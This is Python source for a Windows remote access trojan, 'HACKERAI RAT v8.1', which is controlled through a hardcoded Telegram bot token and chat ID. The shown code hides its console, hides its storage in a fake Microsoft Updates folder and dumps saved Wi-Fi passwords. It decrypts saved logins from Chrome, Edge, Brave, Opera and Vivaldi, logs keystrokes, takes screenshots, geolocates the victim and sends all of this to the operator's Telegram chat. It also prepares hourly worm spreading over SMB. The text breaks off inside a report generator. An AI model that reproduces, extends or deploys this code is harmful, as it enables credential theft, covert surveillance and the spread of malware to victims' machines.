BOT_TOKEN = "8808768825:AAG46x-DBF4HVVujTELCDkW7jzUHDdcX0x"
CHAT_ID = 6504480358

# ════════════════════════════════════════════════════════════════
import os
import sys
import json
import time
import socket
import base64
import sqlite3
import platform
import subprocess
import threading
import requests
import webbrowser
from datetime import datetime
from pathlib import Path
import ctypes
import shutil
import re
import tempfile
import uuid
import winreg
import psutil
import hashlib
import struct
import random
import string
import ipaddress
import urllib.parse
import warnings
warnings.filterwarnings("ignore")

# ─── AUTO INSTALL MISSING DEPENDENCIES ───
REQUIRED_PACKAGES = [
    ("PIL", "pillow"),
    ("cv2", "opencv-python"),
    ("numpy", "numpy"),
    ("sounddevice", "sounddevice"),
    ("soundfile", "soundfile"),
    ("pynput", "pynput"),
    ("win32clipboard", "pywin32"),
    ("win32api", "pywin32"),
    ("win32crypt", "pywin32"),
    ("psutil", "psutil"),
    ("mss", "mss"),
]

def auto_install_deps():
    missing = []
    for module_name, pip_name in REQUIRED_PACKAGES:
        try:
            __import__(module_name)
        except ImportError:
            missing.append(pip_name)
    if missing:
        missing = list(dict.fromkeys(missing))
        for attempt in range(2):
            try:
                cmd = [sys.executable, "-m", "pip", "install"]
                if attempt == 1:
                    cmd.append("--user")
                cmd += missing
                subprocess.check_call(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=180)
                break
            except:
                time.sleep(2)

auto_install_deps()

# ─── IMPORTS WITH FALLBACKS ───
try:
    import cv2
    CV2_AVAILABLE = True
except ImportError:
    CV2_AVAILABLE = False

try:
    import numpy as np
    NUMPY_AVAILABLE = True
except ImportError:
    NUMPY_AVAILABLE = False

try:
    import sounddevice as sd
    SOUNDDEVICE_AVAILABLE = True
except ImportError:
    SOUNDDEVICE_AVAILABLE = False

try:
    import soundfile as sf
    SOUNDFILE_AVAILABLE = True
except ImportError:
    SOUNDFILE_AVAILABLE = False

try:
    from pynput import keyboard
    PYNPUT_AVAILABLE = True
except ImportError:
    PYNPUT_AVAILABLE = False

try:
    import win32clipboard
    WIN32CLIPBOARD_AVAILABLE = True
except ImportError:
    WIN32CLIPBOARD_AVAILABLE = False

try:
    import win32api
    WIN32API_AVAILABLE = True
except ImportError:
    WIN32API_AVAILABLE = False

try:
    import win32crypt
    WIN32CRYPT_AVAILABLE = True
except ImportError:
    WIN32CRYPT_AVAILABLE = False

try:
    import mss
    MSS_AVAILABLE = True
except ImportError:
    MSS_AVAILABLE = False

# ─── CONFIG ───
API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"
SLEEP_INTERVAL = 120
POLL_INTERVAL = 1.5
STORAGE_LIMIT_MB = 100
HEARTBEAT_INTERVAL = 600
MAX_CMD_HISTORY = 1000
CMD_COOLDOWN_SECONDS = 10
EMERGENCY_KILL_FILE = os.path.join(os.environ.get('TEMP', '.'), '.rat_emergency_stop')
WORM_INTERVAL = 3600  # spread every hour

LOGO_URL = "https://i.ibb.co/pjxy79qj/logo.png"
LOGO_FILENAME = "custom_logo.png"

APPDATA_DIR = os.path.join(os.environ.get('APPDATA', tempfile.gettempdir()), 'Microsoft', 'Windows', 'Updates')
DB_PATH = os.path.join(APPDATA_DIR, 'cache.db')
INSTALL_FLAG = os.path.join(APPDATA_DIR, '.installed')

_last_update_id = 0
_listener = None
_pending_aborts = {}
_emergency_activated = False
_start_time = time.time()
_last_executed = {}
_recording_thread = None
_recording_active = False
_callback_counter = int(time.time() * 1000)
_connection_quality = 100

ABORT_WINDOW = 30

# ═══════════════════════════ HELPERS ═══════════════════════════

def check_emergency_file():
    return os.path.exists(EMERGENCY_KILL_FILE)

def tg_send_msg(text, parse_mode=None, reply_to=None, keyboard=None):
    try:
        data = {"chat_id": CHAT_ID, "text": str(text)[:4000]}
        if parse_mode: data["parse_mode"] = parse_mode
        if reply_to: data["reply_to_message_id"] = reply_to
        if keyboard: data["reply_markup"] = json.dumps(keyboard)
        requests.post(f"{API_URL}/sendMessage", data=data, timeout=15)
    except:
        pass

def tg_send_file(file_path, caption=""):
    try:
        with open(file_path, "rb") as f:
            data = {"chat_id": CHAT_ID}
            if caption:
                data["caption"] = str(caption)[:1024]
                data["parse_mode"] = "Markdown"
            requests.post(f"{API_URL}/sendDocument", data=data, files={"document": f}, timeout=120)
    except:
        pass

def tg_send_photo(img_path, caption=""):
    try:
        with open(img_path, "rb") as f:
            data = {"chat_id": CHAT_ID}
            if caption:
                data["caption"] = str(caption)[:1024]
                data["parse_mode"] = "Markdown"
            requests.post(f"{API_URL}/sendPhoto", data=data, files={"photo": f}, timeout=30)
    except:
        pass

def tg_send_video(video_path, caption=""):
    try:
        with open(video_path, "rb") as f:
            data = {"chat_id": CHAT_ID}
            if caption:
                data["caption"] = str(caption)[:1024]
                data["parse_mode"] = "Markdown"
            requests.post(f"{API_URL}/sendVideo", data=data, files={"video": f}, timeout=180)
    except:
        pass

def tg_send_audio(audio_path, caption=""):
    try:
        with open(audio_path, "rb") as f:
            data = {"chat_id": CHAT_ID}
            if caption:
                data["caption"] = str(caption)[:1024]
                data["parse_mode"] = "Markdown"
            requests.post(f"{API_URL}/sendAudio", data=data, files={"audio": f}, timeout=120)
    except:
        pass

def answer_callback(callback_id, text="", show_alert=False):
    try:
        requests.post(f"{API_URL}/answerCallbackQuery", data={
            "callback_query_id": callback_id, "text": text, "show_alert": show_alert
        }, timeout=10)
    except:
        pass

def edit_message_text(chat_id, message_id, text, parse_mode=None, keyboard=None):
    try:
        data = {"chat_id": chat_id, "message_id": message_id, "text": str(text)[:4000]}
        if parse_mode: data["parse_mode"] = parse_mode
        if keyboard: data["reply_markup"] = json.dumps(keyboard)
        requests.post(f"{API_URL}/editMessageText", data=data, timeout=15)
    except:
        pass

def remove_keyboard(chat_id, message_id):
    try:
        requests.post(f"{API_URL}/editMessageReplyMarkup", data={
            "chat_id": chat_id, "message_id": message_id,
            "reply_markup": json.dumps({"inline_keyboard": []})
        }, timeout=10)
    except:
        pass

def get_updates(offset=0):
    try:
        r = requests.get(f"{API_URL}/getUpdates", params={"offset": offset, "timeout": 30}, timeout=35)
        return r.json().get("result", []) if r.status_code == 200 else []
    except:
        return []

# ═══════════════════════════ DATABASE ═══════════════════════════
def init_db():
    os.makedirs(APPDATA_DIR, exist_ok=True)
    conn = sqlite3.connect(DB_PATH, timeout=5)
    conn.execute("PRAGMA journal_mode=WAL")
    cur = conn.cursor()
    cur.executescript('''
        CREATE TABLE IF NOT EXISTS collected_data (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            data_type TEXT NOT NULL, content TEXT, file_path TEXT,
            file_size INTEGER DEFAULT 0, checksum TEXT,
            timestamp TEXT NOT NULL, sent INTEGER DEFAULT 0
        );
        CREATE TABLE IF NOT EXISTS wifi_passwords (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            ssid TEXT NOT NULL, password TEXT, auth_type TEXT,
            timestamp TEXT NOT NULL, sent INTEGER DEFAULT 0
        );
        CREATE TABLE IF NOT EXISTS keystrokes (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            data TEXT NOT NULL, window_title TEXT,
            timestamp TEXT NOT NULL, sent INTEGER DEFAULT 0
        );
        CREATE TABLE IF NOT EXISTS command_history (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            command TEXT NOT NULL, args TEXT, message_id INTEGER,
            sender TEXT, timestamp TEXT NOT NULL,
            duration_ms INTEGER DEFAULT 0, status TEXT DEFAULT 'executed'
        );
        CREATE TABLE IF NOT EXISTS file_tracking (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            file_path TEXT NOT NULL, file_hash TEXT, file_size INTEGER DEFAULT 0,
            purpose TEXT, timestamp TEXT NOT NULL, cleaned INTEGER DEFAULT 0
        );
        CREATE TABLE IF NOT EXISTS tokens (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            source TEXT, token_type TEXT, token_value TEXT,
            timestamp TEXT NOT NULL, sent INTEGER DEFAULT 0
        );
        CREATE TABLE IF NOT EXISTS browser_credentials (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            browser TEXT, profile TEXT, url TEXT, username TEXT,
            password TEXT, timestamp TEXT NOT NULL, sent INTEGER DEFAULT 0
        );
        CREATE TABLE IF NOT EXISTS worm_targets (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            ip TEXT NOT NULL, port INTEGER DEFAULT 445,
            status TEXT DEFAULT 'pending', attempts INTEGER DEFAULT 0,
            last_attempt TEXT, discovered TEXT NOT NULL
        );
    ''')
    conn.commit()
    conn.close()

def log_command(command, args, message_id, sender="telegram", status="executed", duration_ms=0):
    conn = sqlite3.connect(DB_PATH, timeout=5)
    cur = conn.cursor()
    cur.execute("INSERT INTO command_history (command, args, message_id, sender, timestamp, status, duration_ms) VALUES (?, ?, ?, ?, ?, ?, ?)",
        (command, args, message_id, sender, datetime.now().isoformat(), status, duration_ms))
    conn.commit()
    conn.close()

def get_command_history(limit=20):
    conn = sqlite3.connect(DB_PATH, timeout=5)
    cur = conn.cursor()
    cur.execute("SELECT command, args, timestamp, status, duration_ms FROM command_history ORDER BY id DESC LIMIT ?", (limit,))
    rows = cur.fetchall()
    conn.close()
    return rows

# ═══════════════════════════ CORE ═══════════════════════════
def download_custom_logo():
    for attempt in range(3):
        try:
            logo_path = os.path.join(APPDATA_DIR, LOGO_FILENAME)
            r = requests.get(LOGO_URL, timeout=15)
            if r.status_code == 200 and len(r.content) > 1000:
                with open(logo_path, "wb") as f:
                    f.write(r.content)
                try:
                    img = Image.open(logo_path)
                    img.verify()
                    return logo_path
                except:
                    try:
                        os.remove(logo_path)
                    except:
                        pass
                    return None
            return None
        except:
            if attempt < 2:
                time.sleep(2)
    return None

def check_storage():
    try:
        total = sum(os.path.getsize(os.path.join(APPDATA_DIR, f)) for f in os.listdir(APPDATA_DIR)
                    if os.path.isfile(os.path.join(APPDATA_DIR, f)))
        return total / (1024 * 1024)
    except:
        return 0

def track_file(file_path, purpose):
    try:
        file_size = os.path.getsize(file_path)
        file_hash = hashlib.md5(open(file_path, "rb").read()).hexdigest()
    except:
        file_hash = ""
        file_size = 0
    conn = sqlite3.connect(DB_PATH, timeout=5)
    cur = conn.cursor()
    cur.execute("INSERT INTO file_tracking (file_path, file_hash, file_size, purpose, timestamp) VALUES (?, ?, ?, ?, ?)",
        (file_path, file_hash, file_size, purpose, datetime.now().isoformat()))
    conn.commit()
    conn.close()

def cleanup_tracked_files():
    conn = sqlite3.connect(DB_PATH, timeout=5)
    cur = conn.cursor()
    cur.execute("SELECT file_path FROM file_tracking WHERE cleaned=0")
    for row in cur.fetchall():
        try:
            os.remove(row[0])
        except:
            pass
        cur.execute("UPDATE file_tracking SET cleaned=1 WHERE file_path=?", (row[0],))
    conn.commit()
    conn.close()

def store_data(data_type, content=None, file_path=None, file_size=0):
    checksum = ""
    if file_path and os.path.exists(file_path):
        try:
            with open(file_path, "rb") as f:
                checksum = hashlib.md5(f.read()).hexdigest()
            if not file_size:
                file_size = os.path.getsize(file_path)
        except:
            pass
    conn = sqlite3.connect(DB_PATH, timeout=5)
    cur = conn.cursor()
    cur.execute("INSERT INTO collected_data (data_type, content, file_path, file_size, checksum, timestamp) VALUES (?, ?, ?, ?, ?, ?)",
        (data_type, content, file_path, file_size, checksum, datetime.now().isoformat()))
    conn.commit()
    conn.close()

def get_ip_info():
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        try:
            r = requests.get("https://api.ipify.org?format=json", timeout=5)
            public_ip = r.json().get("ip", "N/A")
        except:
            public_ip = "N/A"
        return {"hostname": hostname, "local_ip": local_ip, "public_ip": public_ip}
    except:
        return {"hostname": "N/A", "local_ip": "N/A", "public_ip": "N/A"}

def get_geo():
    try:
        r = requests.get("http://ip-api.com/json/", timeout=5)
        d = r.json()
        if d.get("status") == "success":
            return (f"IP: {d.get('query','N/A')}\nCountry: {d.get('country','N/A')} ({d.get('countryCode','N/A')})\n"
                    f"Region: {d.get('regionName','N/A')}\nCity: {d.get('city','N/A')}\nZIP: {d.get('zip','N/A')}\n"
                    f"ISP: {d.get('isp','N/A')}\nOrg: {d.get('org','N/A')}\nAS: {d.get('as','N/A')}\n"
                    f"Lat/Lon: {d.get('lat','N/A')}, {d.get('lon','N/A')}\nTZ: {d.get('timezone','N/A')}")
        return None
    except:
        return None

def get_system_info():
    try:
        boot = datetime.fromtimestamp(psutil.boot_time()).strftime('%Y-%m-%d %H:%M')
        disk = psutil.disk_usage('/')
        net = psutil.net_io_counters()
        return (f"OS: {platform.system()} {platform.release()}\nVersion: {platform.version()}\n"
                f"Arch: {platform.machine()}\nCPU: {psutil.cpu_count(logical=True)} cores @ {psutil.cpu_percent()}%\n"
                f"RAM: {psutil.virtual_memory().total//(1024**3)}GB ({psutil.virtual_memory().percent}%)\n"
                f"Disk: {disk.used//(1024**3)}GB / {disk.total//(1024**3)}GB ({disk.percent}%)\n"
                f"Net TX: {net.bytes_sent//(1024**2)}MB | RX: {net.bytes_recv//(1024**2)}MB\n"
                f"Boot: {boot}\nUser: {os.environ.get('USERNAME','N/A')}@{platform.node()}")
    except:
        return f"OS: {platform.system()} {platform.release()}"

def get_active_window_title():
    try:
        hwnd = ctypes.windll.user32.GetForegroundWindow()
        length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
        buf = ctypes.create_unicode_buffer(length + 1)
        ctypes.windll.user32.GetWindowTextW(hwnd, buf, length + 1)
        return buf.value
    except:
        return ""

def hide_console():
    try:
        wh = ctypes.windll.kernel32.GetConsoleWindow()
        if wh:
            ctypes.windll.user32.ShowWindow(wh, 0)
    except:
        pass

def take_screenshot():
    try:
        try:
            from PIL import ImageGrab
            img = ImageGrab.grab(all_screens=True)
        except:
            img = ImageGrab.grab()
        if img:
            path = os.path.join(APPDATA_DIR, f"ss_{int(time.time())}.png")
            img.save(path, "PNG", optimize=True)
            if os.path.exists(path) and os.path.getsize(path) > 100:
                track_file(path, "screenshot")
                return path
    except:
        pass
    if MSS_AVAILABLE:
        try:
            with mss.mss() as sct:
                monitor = sct.monitors[1]
                img = sct.grab(monitor)
                path = os.path.join(APPDATA_DIR, f"ss_{int(time.time())}.png")
                mss.tools.to_png(img.rgb, img.size, output=path)
                if os.path.exists(path) and os.path.getsize(path) > 100:
                    track_file(path, "screenshot")
                    return path
        except:
            pass
    return None

# ═══════════════════════════ WIFI ═══════════════════════════
def grab_wifi_passwords_detailed():
    results = []
    try:
        output = subprocess.check_output("netsh wlan show profiles", shell=True,
            creationflags=0x08000000, timeout=10).decode("utf-8", errors="ignore")
        ssids = re.findall(r"Profile\s*:\s(.+)", output)
        for ssid in ssids:
            ssid = ssid.strip()
            if not ssid:
                continue
            try:
                pwd = subprocess.check_output(f'netsh wlan show profile "{ssid}" key=clear',
                    shell=True, creationflags=0x08000000, timeout=10).decode("utf-8", errors="ignore")
                password = "(none)"
                auth = "Open"
                m = re.search(r"Key Content\s*:\s(.+)", pwd)
                if m:
                    password = m.group(1).strip()
                m = re.search(r"Authentication\s*:\s(.+)", pwd)
                if m:
                    auth = m.group(1).strip()
                m = re.search(r"Cipher\s*:\s(.+)", pwd)
                cipher = m.group(1).strip() if m else ""
                results.append(f"{ssid} | {auth}({cipher}) -> {password}")
                store_wifi(ssid, password, auth)
            except:
                results.append(f"{ssid} | (error)")
    except:
        pass
    return results

def store_wifi(ssid, password, auth_type="WPA2"):
    conn = sqlite3.connect(DB_PATH, timeout=5)
    cur = conn.cursor()
    cur.execute("SELECT ssid FROM wifi_passwords WHERE ssid=?", (ssid,))
    if not cur.fetchone():
        cur.execute("INSERT INTO wifi_passwords (ssid, password, auth_type, timestamp) VALUES (?, ?, ?, ?)",
            (ssid, password, auth_type, datetime.now().isoformat()))
        conn.commit()
    conn.close()

def store_keystroke(data, window_title=""):
    conn = sqlite3.connect(DB_PATH, timeout=5)
    cur = conn.cursor()
    cur.execute("INSERT INTO keystrokes (data, window_title, timestamp) VALUES (?, ?, ?)",
        (data, window_title, datetime.now().isoformat()))
    cur.execute("DELETE FROM keystrokes WHERE id NOT IN (SELECT id FROM keystrokes ORDER BY id DESC LIMIT 10000)")
    conn.commit()
    conn.close()

# ═══════════════════════════ INFO CARD ═══════════════════════════
def create_info_card(ip_info, geo_text, sys_text):
    try:
        W, H = 900, 650
        ft = fh = fb = fs = None
        for bold, reg in [("arialbd.ttf","arial.ttf"), ("segoeuib.ttf","segoeui.ttf"),
                          ("consolab.ttf","consola.ttf"), ("courbd.ttf","cour.ttf")]:
            try:
                ft = ImageFont.truetype(bold, 26)
                fh = ImageFont.truetype(bold, 16)
                fb = ImageFont.truetype(reg, 13)
                fs = ImageFont.truetype(reg, 11)
                break
            except:
                continue
        if ft is None:
            ft = fh = fb = fs = ImageFont.load_default()

        img = Image.new("RGB", (W, H), (5, 5, 25))
        draw = ImageDraw.Draw(img)

        for _ in range(200):
            try:
                draw.text((random.randint(0,W-10), random.randint(0,H-10)),
                    random.choice(["0","1"]), font=fs, fill=(0,255,200,random.randint(3,10)))
            except:
                pass

        draw.rounded_rectangle([15,10,W-15,55], radius=12, fill=(0,255,200,25), outline=(0,255,200), width=2)
        draw.text((30,16), "HACKERAI — SYSTEM INTELLIGENCE REPORT", font=ft, fill=(255,255,255))
        draw.text((W-130,20), f"[{datetime.now().strftime('%H:%M:%S')}]", font=fb, fill=(100,100,160))

        draw.rounded_rectangle([20,70,440,210], radius=10, fill=(0,30,60,90), outline=(0,200,255), width=1)
        draw.text((30,78), "NETWORK", font=fh, fill=(0,200,255))
        ny = 102
        for k, v in ip_info.items():
            draw.text((30,ny), f"> {k.replace('_',' ').upper()}:", font=fb, fill=(150,150,200))
            draw.text((165,ny), str(v), font=fb, fill=(230,230,255))
            ny += 24

        draw.rounded_rectangle([460,70,880,210], radius=10, fill=(0,40,20,90), outline=(0,255,100), width=1)
        draw.text((470,78), "SYSTEM", font=fh, fill=(0,255,100))
        sy = 102
        if sys_text:
            for line in sys_text.split("\n")[:5]:
                if ":" in line:
                    k, v = line.split(":", 1)
                    draw.text((470,sy), f"> {k.strip()}:", font=fb, fill=(150,200,150))
                    draw.text((600,sy), v.strip(), font=fb, fill=(230,255,230))
                else:
                    draw.text((470,sy), line.strip(), font=fb, fill=(180,220,180))
                sy += 24

        draw.rounded_rectangle([20,225,880,410], radius=10, fill=(40,25,0,90), outline=(255,215,0), width=1)
        draw.text((30,232), "GEOLOCATION", font=fh, fill=(255,215,0))
        gy = 255
        if geo_text:
            for line in geo_text.split("\n")[:8]:
                draw.text((30,gy), f"> {line.strip()}", font=fb, fill=(230,220,180))
                gy += 22

        draw.rounded_rectangle([20,425,880,540], radius=10, fill=(40,0,20,90), outline=(255,0,100), width=1)
        draw.text((30,433), "TARGET STATUS", font=fh, fill=(255,0,100))
        uptime = f"{int((time.time()-_start_time)//3600)}h {int(((time.time()-_start_time)%3600)//60)}m"
        status = [
            ("PERSISTENCE","ACTIVE",(0,255,100)), ("UPTIME",uptime,(0,200,255)),
            ("STORAGE",f"{check_storage():.1f}MB",(200,200,255)),
            ("KEYLOGGER","ON" if _listener else "OFF",(0,255,100) if _listener else (100,100,160)),
            ("RECORDING","ACTIVE" if _recording_active else "IDLE",(255,200,0) if _recording_active else (100,100,160)),
            ("EMERGENCY","ACTIVE" if _emergency_activated else "CLEAR",(255,50,50) if _emergency_activated else (0,255,100)),
        ]
        for i, (l, v, c) in enumerate(status):
            col, row = 0 if i < 3 else 1, i % 3
            sx, sy2 = 30 + (col * 430), 455 + (row * 24)
            draw.text((sx,sy2), f"* {l}:", font=fb, fill=(100,100,160))
            draw.text((sx+155,sy2), v, font=fb, fill=c)

        draw.line([20,560,880,560], fill=(100,100,160), width=1)
        footer = f"HACKERAI RAT v8.1 - {platform.node()}"
        draw.text(((W-draw.textlength(footer,font=fb))//2,570), footer, font=fb, fill=(80,80,120))

        path = os.path.join(APPDATA_DIR, f"info_{int(time.time())}.png")
        img.save(path, "PNG", optimize=True)
        return path if (os.path.exists(path) and os.path.getsize(path) > 100) else None
    except:
        return None

# ═══════════════════════════ CREDENTIAL EXTRACTION ═══════════════════════════
def decrypt_chrome_password(password_bytes):
    if not password_bytes:
        return ""
    try:
        if WIN32CRYPT_AVAILABLE:
            try:
                decrypted = win32crypt.CryptUnprotectData(password_bytes, None, None, None, 0)
                return decrypted[1].decode('utf-8') if decrypted[1] else ""
            except:
                pass
        try:
            from ctypes import windll, byref, c_uint32, create_string_buffer, c_char_p
            class DATA_BLOB(ctypes.Structure):
                _fields_ = [("cbData", c_uint32), ("pbData", ctypes.POINTER(ctypes.c_char))]
            blob_in = DATA_BLOB(len(password_bytes), ctypes.cast(password_bytes, ctypes.POINTER(ctypes.c_char)))
            blob_out = DATA_BLOB(0, None)
            if windll.crypt32.CryptUnprotectData(
                ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)):
                data = create_string_buffer(blob_out.cbData)
                ctypes.memmove(data, blob_out.pbData, blob_out.cbData)
                windll.kernel32.LocalFree(blob_out.pbData)
                return data.value.decode('utf-8')
        except:
            pass
        return f"[encrypted: {len(password_bytes)} bytes]"
    except:
        return ""

def extract_browser_data():
    results = []
    all_creds = {}
    total_creds = 0
    browsers = {
        "Chrome": os.path.join(os.environ.get('LOCALAPPDATA',''), 'Google','Chrome','User Data'),
        "Edge": os.path.join(os.environ.get('LOCALAPPDATA',''), 'Microsoft','Edge','User Data'),
        "Brave": os.path.join(os.environ.get('LOCALAPPDATA',''), 'BraveSoftware','Brave-Browser','User Data'),
        "Opera": os.path.join(os.environ.get('APPDATA',''), 'Opera Software','Opera Stable'),
        "Vivaldi": os.path.join(os.environ.get('LOCALAPPDATA',''), 'Vivaldi','User Data'),
    }
    for browser, base_path in browsers.items():
        if not os.path.exists(base_path):
            continue
        try:
            profiles = ['Default']
            for d in os.listdir(base_path):
                if d.startswith('Profile ') and os.path.isdir(os.path.join(base_path, d)):
                    profiles.append(d)
            browser_found = False
            for profile in profiles:
                login_db = os.path.join(base_path, profile, 'Login Data')
                if not os.path.exists(login_db):
                    continue
                try:
                    dst = os.path.join(APPDATA_DIR, f'tmp_{browser}_{profile.replace(" ","_")}_logins.db')
                    shutil.copy2(login_db, dst)
                    conn = sqlite3.connect(dst)
                    cur = conn.cursor()
                    cur.execute("SELECT origin_url, username_value, password_value FROM logins")
                    creds = []
                    for url, username, password in cur.fetchall():
                        if not url or not username:
                            continue
                        try:
                            password_dec = decrypt_chrome_password(password)
                            creds.append({
                                'url': url[:120] if len(url) > 120 else url,
                                'username': username,
                                'password': password_dec
                            })
                        except:
                            creds.append({
                                'url': url[:120],
                                'username': username,
                                'password': '[decrypt error]'
                            })
                    conn.close()
                    os.remove(dst)
                    if creds:
                        if browser not in all_creds:
                            all_creds[browser] = {}
                        all_creds[browser][profile] = creds
                        total_creds += len(creds)
                        results.append(f"✓ {browser}/{profile}: {len(creds)} credentials")
                        browser_found = True
                        conn2 = sqlite3.connect(DB_PATH, timeout=5)
                        cur2 = conn2.cursor()
                        for c in creds:
                            try:
                                cur2.execute(
                                    "INSERT INTO browser_credentials (browser, profile, url, username, password, timestamp) VALUES (?, ?, ?, ?, ?, ?)",
                                    (browser, profile, c['url'], c['username'], c['password'][:200], datetime.now().isoformat()))
                            except:
                                pass
                        conn2.commit()
                        conn2.close()
                        store_data(f"{browser}_login",
                                  content=f"{profile}: {len(creds)} creds\nSample: {creds[0]['url']} | {creds[0]['username']} | {creds[0]['password'][:50]}")
                except Exception as e:
                    results.append(f"✗ {browser}/{profile}: {str(e)[:60]}")
            if not browser_found:
                results.append(f"○ {browser}: No login data found")
        except Exception as e:
            results.append(f"✗ {browser}: {str(e)[:60]}")
    if all_creds:
        report_path = os.path.join(APPDATA_DIR, f'credentials_{int(time.time())}.txt')
        with open(report_path, 'w', encoding='utf-8') as f:
            f.write("╔══════════════════════════════════════════════════════════════╗\n")
            f.write("║        HACKERAI — BROWSER CREDENTIAL EXTRACTION REPORT      ║\n")
            f.write("║        Extracted: " + datetime.now().strftime('%Y-%m-%d %H:%M:%S') + "                     ║\n")
            f.write("╚══════════════════════════════════════════════════════════════╝\n\n")
            f.write(f"Total Credentials Found: {total_creds}\n")
            f.write(f"Target: {platform.node()}\n\n")
            for browser, profiles in all_creds.items():
                for profile, creds in profiles.items():
                    f.write(f"\n{'='*80}\n")
                    f.write(f"  {browser} — Profile: {profile}\n")
                    f.write(f"  Credentials: {len(creds)}\n")
                    f.write(f"{'='*80}\n\n")
                    for i, c in enumerate(creds, 1):
                        f.write(f"  [{i:03d}] URL:      {c['url']}\n")
                        f.write(f"        Username: {c['username']}\n")
                        f.write(f"        Password: {c['password']}\n")
                        f.write(f"        {'─'*70}\n")
        store_data("browser_creds", file_path=report_path)
        results.append(f"\n✅ Report saved: {report_path} ({os.path.getsize(report_path)//1024}KB)")
    if not results:
        results.append("❌ No browser installations or login data found")
    return results, all_creds, total_creds

def cmd_browser_full_report(args):
    tg_send_msg("🔍 Extracting browser credentials... This may take a moment.", parse_mode="Markdown")
    results, creds, total = extract_browser_data()
    if total == 0:
        msg = "❌ *No browser credentials found*\n\n"
        msg += "Browser login data is typically stored here:\n"
        msg += "• Chrome: `%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data`\n"
        msg += "• Edge: `%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default\\Login Data`\n"
        msg += "• Brave: `%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data`\n\n"
        msg += "Requirements:\n"
        msg += "• Browser must have saved logins\n"
        msg += "• Target must be logged in\n"
        msg += "• May require elevated privileges\n\n"
        msg += f"_Results:_\n"
        for r in results:
            msg += f"  {r}\n"
        tg_send_msg(msg, parse_mode="Markdown")
        return "No credentials found. Details sent."
    summary = f"🔐 *Browser Credential Extraction*\n\n"
    summary += f"📊 *Total: {total} credentials found*\n\n"
    for r in results:
        if r.startswith("✓") or r.startswith("○"):
            summary += f"  {r}\n"
    if creds:
        summary += "\n*Breakdown:*\n"
        for browser, profiles in creds.items():
            profile_count = sum(len(c) for c in profiles.values())
            summary += f"  • {browser}: {profile_count} credentials\n"
    tg_send_msg(summary, parse_mode="Markdown")
    conn = sqlite3.connect(DB_PATH, timeout=5)
    cur = conn.cursor()
    cur.execute("SELECT file_path FROM collected_data WHERE data_type='browser_creds' AND sent=0 ORDER BY id DESC LIMIT 1")
    row = cur.fetchone()
    if row and row[0] and os.path.exists(row[0]):
        size_kb = os.path.getsize(row[0]) // 1024
        tg_send_file(row[0], f"📋 Full Credential Report | {total} logins | {size_kb}KB")
        cur.execute("UPDATE collected_data SET sent=1 WHERE file_path=?", (row[0],))
    for browser, profiles in creds.items():
        profile_count = sum(len(c) for c in profiles.values())
        if profile_count > 5:
            temp_path = os.path.join(APPDATA_DIR, f'{browser}_creds_{int(time.time())}.txt')
            with open(temp_path, 'w', encoding='utf-8') as f:
                f.write(f"{browser} CREDENTIALS\n{'='*60}\n\n")
                for profile, creds_list in profiles.items():
                    f.write(f"[{profile}]\n")
                    for c in creds_list:
                        f.write(f"  {c['url']} | {c['username']} | {c['password']}\n")
            try:
                tg_send_file(temp_path, f"🔑 {browser} — {profile_count} logins")
                try:
                    os.remove(temp_path)
                except:
                    pass
            except:
                try:
                    os.remove(temp_path)
                except:
                    pass
    conn.commit()
    conn.close()
    return f"✅ Extracted {total} credentials from {len(creds)} browsers. Full report sent!"

# ═══════════════════════════ HTML REPORT GENERATOR ═══════════════════════════
def generate_html_report():
    ip_info = get_ip_info()
    geo_text = get_geo() or "N/A"
    sys_text = get_system_info()
    wifi_networks = []
    try:
        conn = sqlite3.connect(DB_PATH, timeout=5)
        cur = conn.cursor()
        cur.execute("SELECT ssid, password, auth_type, timestamp FROM wifi_passwords ORDER BY id DESC LIMIT 50")
        wifi_networks = cur.fetchall()
        conn.close()
    except:
        pass
    cred_count = 0
    try:
        conn = sqlite3.connect(DB_PATH, timeout=5)
        cur = conn.cursor()
        cur.execute("SELECT COUNT(*) FROM browser_credentials")
        cred_count = cur.fetchone()[0]
        conn.close()
    except:
        pass
    processes = []
    try:
        for proc in sorted(psutil.process_iter(['pid','name','cpu_percent','memory_percent']),
                          key=lambda x: x.info.get('cpu_percent',0) or 0, reverse=True)[:20]:
            try:
                processes.append(f"{proc.info['pid']} | {proc.info['cpu_percent']:.1f}% | {proc.info['memory_percent']:.1f}% | {proc.info['name']}")
            except:
                pass
    except:
        pass
    disk = psutil.disk_usage('/')
    net = psutil.net_io_counters()
    uptime_seconds = time.time() - _start_time
    uptime_str = f"{int(uptime_seconds//3600)}h {int((uptime_seconds%3600)//60)}m {int(uptime_seconds%60)}s"
    geo_city = geo_country = geo_isp = geo_latlon = geo_region = ""
    if geo_text:
        for line in geo_text.split('\n'):
            if 'City:' in line:
                geo_city = line.split(':',1)[1].strip()
            if 'Country:' in line:
                geo_country = line.split(':',1)[1].strip()
            if 'ISP:' in line:
                geo_isp = line.split(':',1)[1].strip()
            if 'Lat/Lon:' in line:
                geo_latlon = line.split(':',1)[1].strip()
            if 'Region:' in line:
                geo_region = line.split(':',1)[1].strip()
    os_line = cpu_line = ram_line = disk_line = user_line = ""
    if sys_text:
        for line in sys_text.split('\n'):
            if line.startswith('OS:'):
                os_line = line.split(':',1)[1].strip()
            if 'cores' in line:
                cpu_line = line.split(':',1)[1].strip() if ':' in line else line
            if line.startswith('RAM:'):
                ram_line = line.split(':',1)[1].strip()
            if line.startswith('Disk:'):
                disk_line = line.split(':',1)[1].strip()
            if line.startswith('User:'):
                user_line = line.split(':',1)[1].strip()
    hostname = ip_info.get('hostname', 'N/A')
    public_ip = ip_info.get('public_ip', 'N/A')
    local_ip = ip_info.get('local_ip', 'N/A')
